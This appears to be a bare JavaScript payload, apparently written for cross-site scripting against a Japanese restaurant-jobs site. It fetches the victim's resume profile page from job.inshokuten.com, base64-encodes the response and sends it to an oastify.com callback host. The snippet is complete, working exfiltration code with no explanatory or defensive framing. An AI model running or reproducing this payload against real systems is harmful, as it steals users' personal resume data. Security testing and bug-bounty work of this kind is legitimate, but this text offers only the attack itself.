var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://job.inshokuten.com/member/resume/profile', false);
xhr.send(null);

if (xhr.status === 200) { // Check if the request was successful
    var responseText = xhr.responseText;
    
    // Ensure proper encoding of the response
    try {
        var encodedResponse = encodeURIComponent(btoa(unescape(encodeURIComponent(responseText))));
        var exfilUrl = "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + encodedResponse;
        var exfil = new XMLHttpRequest();
        exfil.open("GET", exfilUrl, false);
        exfil.send();
    } catch (e) {
        console.error("Encoding failed: ", e);
    }
}
